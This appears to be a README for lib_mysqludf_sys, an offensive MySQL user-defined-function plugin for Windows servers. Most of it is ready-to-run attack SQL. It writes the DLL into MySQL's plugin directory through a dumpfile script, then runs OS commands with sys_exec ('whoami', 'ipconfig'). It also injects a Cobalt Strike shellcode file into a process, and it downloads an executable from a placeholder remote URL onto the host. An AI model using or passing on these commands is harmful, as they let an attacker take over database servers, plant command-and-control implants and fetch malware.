# lib_mysqludf_sys
lib_mysqludf_sys is a udf plugin of MySQL.

## Into Dumpfile

1.python3 udf_Bin2Hex.py 1 Release\lib_mysqludf_sys_x64.dll "C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\lib_mysqludf_sys_x64.dll" > lib_mysqludf_sys_x64.sql

2.exec .sql file


## Sys_exec

create function sys_exec returns string soname "lib_mysqludf_sys_x64.dll"; 
select sys_exec("chcp 65001 & ipconfig");drop function sys_exec;

create function sys_exec returns string soname "lib_mysqludf_sys_x64.dll"; 
select sys_exec("whoami");drop function sys_exec;

## Inject

1.Generate Stage/Stageless RAW file for Cobalt Strike


2.Dumpfile in MySQL machine


3.Inject shellcode
create function inject returns string soname "lib_mysqludf_sys_x64.dll"; select inject(hex(load_file("C:\\raw.bin")),"AppVNice.exe");drop function inject;

## Download

create function download returns string soname "lib_mysqludf_sys_x64.dll"; 
select download("http://xxxx/xxx.exe","C:\\11111.exe");drop function download;

